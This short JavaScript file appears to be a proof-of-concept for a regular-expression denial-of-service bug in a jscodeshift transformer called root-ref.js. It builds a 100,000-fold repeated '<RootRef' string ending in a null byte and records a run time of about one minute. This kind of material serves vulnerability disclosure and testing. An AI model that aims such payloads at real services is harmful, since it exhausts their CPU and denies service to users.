import transformer from "./root-ref.js";

//Attack String :""+"<RootRef"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "<RootRef";
}
str += "\u0000";

const file = {
  source: str,
};

var result = transformer(file);

// real    1m3.261s
// user    1m3.226s
// sys     0m0.010s

//原意需传入的file类型: import("jscodeshift").FileInfo;
